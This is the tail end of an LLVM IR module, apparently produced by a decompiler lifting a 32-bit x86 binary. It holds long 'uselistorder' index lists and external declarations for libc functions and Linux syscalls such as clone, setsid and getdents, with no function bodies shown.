39, 40, 41, 42, 43, 44, 45, 46, 47, 253, 48, 49, 50, 51, 52, 53, 254, 255, 54, 55, 56, 57, 58, 59, 60, 61, 62, 256, 63, 64, 65, 66, 257, 258, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 259, 260, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 261, 263, 264, 266, 267, 265, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 268, 269, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 270, 272, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 273, 165, 166, 167, 168, 285, 286, 8, 134, 135, 136, 137, 287, 138, 139, 288, 290, 291, 292, 293, 141, 294, 158, 289, 140, 295, 296, 297, 298, 149, 150, 299, 151, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 152, 153, 154, 155, 156, 339, 342, 343, 344, 399, 400, 345, 346, 9, 20 }
  uselistorder i32 (i32)* @__get_pc_thunk_bx, { 1, 0 }
  uselistorder i32 0, { 617, 753, 754, 309, 1291, 1292, 1293, 1294, 1295, 1296, 1297, 68, 223, 93, 94, 618, 1299, 1301, 619, 755, 756, 620, 243, 95, 1302, 1303, 310, 311, 1304, 1305, 273, 274, 86, 621, 1306, 0, 1307, 1308, 96, 1283, 26, 1284, 1285, 1286, 27, 97, 1312, 64, 98, 72, 1313, 50, 622, 99, 28, 87, 100, 1314, 224, 1315, 1316, 1317, 244, 1318, 1325, 1319, 1320, 1321, 1322, 1323, 1324, 623, 624, 1326, 1327, 1328, 1329, 1330, 1331, 1332, 1333, 1334, 1335, 1336, 625, 626, 1337, 1338, 1339, 1340, 1341, 1342, 1343, 1344, 1345, 1347, 1346, 225, 627, 1, 1348, 2, 1349, 1350, 1351, 1352, 1353, 1354, 1355, 1356, 1357, 1358, 1359, 1360, 1361, 628, 1362, 1363, 1364, 227, 1370, 1365, 1366, 1367, 1368, 1369, 629, 226, 1371, 1372, 1373, 1374, 1375, 1376, 1377, 1378, 312, 1379, 1380, 1381, 1382, 1383, 1384, 1385, 1386, 3, 1387, 1388, 630, 1389, 1390, 1391, 1392, 1393, 1394, 1395, 1396, 1397, 1398, 1399, 1400, 1401, 1402, 1403, 1404, 631, 632, 1405, 101, 1406, 1407, 1408, 1409, 4, 1410, 1411, 1412, 1413, 1414, 1415, 1416, 1417, 1418, 1419, 5, 1420, 1421, 1423, 1424, 103, 102, 1425, 1437, 633, 73, 634, 1438, 1439, 1440, 1445, 1446, 1441, 1442, 1443, 1444, 1447, 635, 1448, 1449, 1450, 245, 636, 1458, 1459, 637, 1460, 1487, 1488, 1489, 757, 758, 638, 879, 275, 639, 759, 760, 276, 640, 1461, 1462, 1463, 1464, 970, 969, 1465, 1451, 762, 761, 763, 880, 881, 882, 1490, 1491, 971, 6, 277, 1492, 1503, 1504, 67, 29, 641, 30, 104, 642, 1505, 643, 1516, 1518, 229, 1519, 228, 313, 1517, 1512, 1493, 105, 1494, 1495, 106, 1496, 7, 8, 644, 246, 1300, 1298, 1511, 1422, 107, 972, 645, 314, 646, 973, 1506, 1507, 1508, 767, 768, 1234, 1231, 1232, 1233, 230, 1235, 1236, 1237, 1238, 1239, 1241, 1240, 232, 1242, 1243, 1244, 1248, 1245, 1246, 1247, 231, 1249, 1250, 1251, 279, 278, 1252, 9, 1253, 1254, 1255, 315, 1257, 1256, 233, 108, 724, 725, 51, 726, 647, 316, 317, 727, 612, 1497, 1498, 614, 318, 319, 53, 1499, 648, 1500, 52, 649, 1501, 560, 1502, 247, 109, 320, 650, 110, 1468, 1469, 1470, 1471, 1472, 248, 1473, 1474, 1475, 321, 1466, 17, 322, 1467, 323, 1452, 88, 1454, 651, 249, 652, 1455, 1426, 1427, 1428, 1429, 1430, 1431, 1432, 1433, 1434, 250, 251, 1435, 653, 1436, 111, 654, 655, 324, 561, 656, 325, 562, 326, 112, 657, 1476, 1477, 113, 114, 327, 563, 252, 1478, 1479, 1480, 115, 116, 328, 564, 89, 1481, 234, 1482, 71, 1483, 1484, 1486, 658, 1485, 10, 764, 11, 769, 770, 771, 772, 565, 12, 773, 774, 775, 776, 777, 956, 974, 934, 975, 976, 778, 1287, 1456, 1457, 1453, 883, 884, 659, 329, 765, 117, 118, 885, 660, 891, 892, 661, 893, 119, 120, 886, 887, 888, 889, 890, 894, 1509, 1510, 90, 91, 92, 779, 978, 977, 895, 780, 919, 1309, 1310, 1311, 1513, 1514, 1515, 766, 979, 74, 31, 662, 980, 566, 981, 982, 253, 983, 13, 54, 75, 32, 76, 33, 984, 14, 55, 77, 34, 78, 35, 122, 121, 79, 36, 123, 124, 781, 330, 896, 663, 615, 1276, 1277, 1278, 1279, 1280, 1281, 127, 126, 125, 1282, 331, 130, 128, 129, 664, 665, 666, 985, 221, 667, 1258, 37, 668, 80, 38, 131, 669, 132, 670, 782, 333, 567, 783, 784, 785, 796, 786, 671, 787, 135, 136, 672, 788, 789, 790, 794, 730, 731, 728, 729, 39, 236, 237, 222, 673, 674, 732, 791, 792, 793, 739, 740, 675, 733, 734, 735, 736, 737, 738, 741, 742, 743, 134, 676, 795, 235, 797, 798, 137, 677, 799, 800, 801, 802, 803, 804, 812, 809, 810, 811, 805, 806, 807, 808, 813, 678, 679, 138, 680, 332, 568, 815, 816, 817, 818, 819, 820, 254, 255, 821, 822, 823, 681, 824, 825, 826, 827, 828, 829, 830, 831, 832, 833, 139, 256, 834, 140, 682, 569, 18, 570, 835, 133, 141, 683, 142, 684, 143, 257, 814, 144, 571, 957, 69, 836, 837, 838, 839, 840, 841, 842, 145, 843, 844, 845, 846, 847, 848, 849, 850, 851, 852, 853, 854, 280, 281, 685, 334, 572, 686, 855, 856, 857, 15, 687, 258, 335, 573, 574, 575, 336, 147, 146, 858, 259, 148, 150, 286, 293, 21, 20, 859, 860, 861, 288, 289, 282, 283, 862, 149, 688, 40, 56, 689, 284, 863, 285, 864, 287, 290, 865, 291, 866, 292, 867, 868, 869, 870, 871, 872, 873, 874, 875, 294, 876, 877, 878, 41, 81, 19, 690, 897, 903, 295, 898, 899, 296, 297, 900, 298, 901, 299, 902, 59, 904, 300, 905, 301, 906, 907, 302, 303, 908, 304, 909, 910, 911, 912, 691, 913, 914, 915, 916, 58, 337, 151, 152, 692, 917, 918, 65, 82, 153, 57, 260, 693, 261, 154, 262, 576, 155, 958, 959, 960, 42, 156, 616, 43, 577, 157, 920, 158, 694, 578, 308, 44, 695, 66, 696, 697, 579, 921, 263, 922, 923, 580, 924, 264, 159, 160, 161, 162, 581, 163, 240, 164, 698, 582, 699, 583, 925, 265, 926, 584, 165, 166, 585, 83, 167, 700, 586, 701, 587, 927, 266, 928, 168, 169, 170, 588, 45, 702, 589, 171, 703, 590, 591, 172, 173, 592, 241, 174, 704, 593, 929, 22, 705, 594, 930, 267, 931, 595, 175, 176, 177, 178, 179, 180, 181, 596, 84, 597, 182, 706, 598, 707, 599, 932, 268, 933, 600, 183, 184, 185, 186, 187, 188, 189, 190, 601, 935, 936, 937, 191, 938, 939, 940, 708, 941, 942, 943, 23, 24, 25, 709, 85, 944, 945, 946, 947, 948, 949, 950, 951, 602, 952, 269, 953, 603, 192, 193, 194, 195, 196, 197, 604, 605, 199, 710, 606, 198, 711, 607, 954, 270, 955, 608, 200, 201, 202, 609, 961, 962, 963, 204, 964, 965, 712, 966, 203, 713, 610, 967, 271, 968, 205, 206, 207, 611, 744, 745, 746, 747, 748, 749, 750, 751, 986, 987, 988, 989, 990, 991, 992, 209, 714, 999, 1000, 1001, 1002, 1003, 1004, 1005, 1006, 1007, 1008, 1009, 1010, 993, 994, 995, 996, 997, 998, 1011, 1012, 1013, 1014, 1015, 1016, 1017, 1018, 1019, 1020, 1021, 1022, 210, 715, 1032, 1033, 1034, 1035, 1036, 1037, 1038, 1039, 1040, 1041, 63, 1042, 1043, 1044, 1045, 1046, 1047, 1048, 1049, 1050, 1051, 1052, 1053, 1054, 1055, 208, 1056, 1057, 1058, 1059, 1060, 1061, 1062, 1063, 1064, 1065, 1066, 1067, 1068, 1069, 1070, 1071, 48, 1072, 1073, 1074, 1023, 1024, 1025, 1026, 1027, 1028, 1029, 1030, 1031, 1075, 1076, 1077, 1078, 1079, 1080, 1081, 1082, 1083, 1084, 211, 716, 1085, 1086, 1087, 1088, 1089, 1090, 1091, 1092, 1093, 1094, 1095, 1096, 1097, 1098, 1099, 1100, 1101, 1102, 1103, 338, 1104, 1105, 1106, 1107, 1108, 1109, 1110, 1111, 1112, 1113, 1114, 1115, 1116, 1117, 1118, 1119, 1120, 1121, 1122, 1123, 1124, 1125, 1126, 1127, 1128, 1129, 1130, 1131, 1132, 1133, 1134, 1135, 1136, 1137, 1138, 1139, 1140, 1141, 1142, 1143, 1144, 1145, 717, 1154, 1146, 1147, 1148, 1149, 1150, 1151, 1152, 1153, 1155, 1156, 1157, 1158, 1159, 1160, 1161, 1162, 1163, 1164, 1165, 1166, 1167, 1168, 1169, 1170, 1171, 1172, 1173, 212, 718, 1174, 1175, 1176, 1177, 1178, 1179, 1180, 1181, 1182, 1183, 1184, 1185, 1186, 1187, 1188, 1189, 1190, 1192, 1191, 1193, 1194, 1195, 1196, 1197, 1198, 1199, 1200, 1201, 1202, 1203, 1204, 1205, 1206, 1207, 1208, 1209, 1210, 1211, 719, 1212, 213, 720, 1213, 1214, 613, 305, 1215, 1216, 721, 306, 1217, 1218, 1219, 1220, 1221, 70, 1222, 46, 60, 61, 62, 1223, 1224, 1225, 1226, 1227, 1228, 1229, 1230, 272, 214, 215, 339, 47, 722, 1259, 307, 1260, 1261, 1262, 1263, 1264, 1265, 1266, 1267, 1268, 1269, 1270, 1271, 1272, 216, 1273, 242, 1274, 1275, 239, 723, 49, 340, 217, 341, 218, 219, 16, 1288, 1289, 1290, 220, 752, 238, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 1520, 1521, 1522, 1523, 1524, 1525, 1526, 1527 }
  uselistorder i32* @ebx, { 57, 818, 3, 819, 820, 821, 4, 822, 823, 824, 825, 826, 827, 828, 829, 832, 833, 836, 61, 62, 63, 64, 65, 66, 58, 59, 60, 837, 838, 839, 840, 850, 851, 852, 853, 854, 855, 856, 857, 858, 859, 860, 861, 862, 863, 864, 865, 866, 867, 5, 868, 6, 869, 870, 871, 872, 884, 873, 874, 875, 876, 877, 878, 879, 880, 881, 882, 883, 885, 886, 887, 888, 889, 890, 891, 892, 893, 894, 895, 896, 897, 898, 899, 900, 901, 902, 903, 904, 905, 906, 907, 908, 7, 909, 8, 910, 911, 912, 9, 913, 914, 915, 27, 10, 24, 916, 917, 918, 919, 920, 921, 922, 923, 924, 925, 926, 927, 928, 929, 930, 931, 933, 932, 934, 935, 936, 937, 938, 939, 940, 941, 942, 943, 944, 945, 946, 947, 948, 949, 950, 951, 952, 953, 954, 955, 956, 957, 958, 959, 960, 11, 963, 964, 965, 966, 967, 968, 969, 974, 975, 976, 977, 978, 979, 980, 981, 982, 12, 983, 984, 986, 985, 987, 988, 989, 990, 991, 25, 992, 993, 994, 13, 995, 1019, 67, 68, 69, 70, 71, 72, 73, 74, 75, 293, 294, 76, 1020, 14, 1021, 1022, 576, 577, 578, 579, 582, 583, 584, 580, 581, 996, 997, 295, 296, 297, 298, 299, 300, 1058, 585, 586, 1023, 1024, 1025, 1059, 29, 30, 2, 1070, 1071, 1072, 1092, 1093, 1094, 1095, 1073, 1078, 1090, 1091, 1060, 1061, 1079, 1080, 1081, 1082, 834, 835, 830, 831, 1076, 1077, 961, 962, 587, 588, 589, 590, 591, 592, 1074, 1075, 756, 15, 757, 758, 26, 31, 16, 32, 1026, 1062, 1063, 1064, 1065, 1066, 1067, 1068, 1069, 77, 78, 79, 80, 1027, 1030, 1031, 1032, 1033, 1034, 1035, 1036, 1037, 1038, 1039, 17, 1028, 1029, 998, 999, 1000, 1001, 1002, 1003, 1004, 1005, 1006, 1007, 1008, 1009, 1010, 18, 1011, 1012, 1013, 1014, 1015, 1016, 1017, 1018, 970, 971, 972, 973, 1040, 1041, 1042, 1043, 1044, 1045, 1046, 1047, 1048, 28, 1049, 1050, 1051, 1052, 19, 1053, 1054, 1055, 1056, 1057, 84, 85, 86, 87, 88, 550, 551, 552, 553, 593, 594, 595, 596, 494, 495, 496, 497, 597, 598, 599, 600, 601, 602, 603, 604, 89, 90, 91, 92, 301, 302, 303, 304, 305, 306, 307, 308, 81, 82, 83, 309, 310, 316, 317, 318, 319, 311, 312, 313, 314, 315, 320, 321, 322, 323, 605, 606, 607, 608, 609, 610, 613, 614, 615, 611, 612, 324, 325, 326, 93, 94, 359, 360, 841, 842, 843, 844, 845, 846, 847, 848, 849, 1083, 1084, 1085, 1086, 1087, 1088, 1089, 95, 96, 97, 759, 760, 616, 617, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 44, 45, 223, 46, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 47, 48, 49, 50, 51, 52, 224, 225, 226, 227, 228, 229, 230, 232, 231, 242, 243, 244, 245, 246, 253, 254, 255, 247, 248, 249, 250, 251, 252, 233, 234, 235, 236, 237, 238, 239, 240, 241, 554, 555, 556, 557, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 274, 275, 276, 277, 278, 279, 280, 269, 270, 271, 272, 273, 281, 282, 283, 0, 284, 285, 286, 287, 288, 289, 290, 291, 292, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 362, 363, 364, 371, 365, 366, 367, 368, 369, 370, 372, 373, 374, 375, 361, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 20, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 536, 534, 535, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 558, 559, 562, 560, 561, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 53, 54, 55, 56, 618, 619, 620, 621, 622, 625, 626, 627, 628, 629, 630, 631, 632, 633, 623, 624, 21, 634, 635, 636, 637, 638, 639, 640, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 1, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 22, 671, 641, 642, 643, 644, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 670, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 752, 753, 754, 755, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779, 780, 781, 782, 783, 784, 785, 786, 787, 788, 789, 790, 794, 791, 792, 793, 795, 796, 797, 798, 799, 23, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 812, 813, 814, 815, 816, 817 }
}

; Function Attrs: nounwind readnone
declare i32 @llvm.ctlz.i32(i32, i1) #0

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #0

declare i8* @_memset(i8*, i32, i32) local_unnamed_addr

declare i8* @_memcpy(i8*, i8*, i32) local_unnamed_addr

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #0

declare i32 @__libc_errno(i32) local_unnamed_addr

declare i32 @int80_syscall(i32) local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @setsid() local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @clock_getres(i32, %timespec*) local_unnamed_addr

declare i32 @clone(i32 (i32*)*, i32*, i32, i32*, ...) local_unnamed_addr

declare i32 @getpid() local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare i32 @fstat64(i32, %stat64*) local_unnamed_addr

declare i32 @getdents(i32, %linux_dirent*, i32) local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @brk(i32*) local_unnamed_addr

declare i32 @getdents64(i32, %linux_dirent64*, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8 @__decompiler_undefined_function_1() local_unnamed_addr

declare i16 @__decompiler_undefined_function_2() local_unnamed_addr

declare i8* @__decompiler_undefined_function_3() local_unnamed_addr

declare i16* @__decompiler_undefined_function_4() local_unnamed_addr

declare i64 @__decompiler_undefined_function_5() local_unnamed_addr

declare i8** @__decompiler_undefined_function_6() local_unnamed_addr

declare %_TYPEDEF_sigset_t* @__decompiler_undefined_function_7() local_unnamed_addr

declare %sigaction* @__decompiler_undefined_function_8() local_unnamed_addr

declare %linux_dirent* @__decompiler_undefined_function_9() local_unnamed_addr

; Function Attrs: noreturn nounwind
declare void @llvm.trap() #1

attributes #0 = { nounwind readnone }
attributes #1 = { noreturn nounwind }
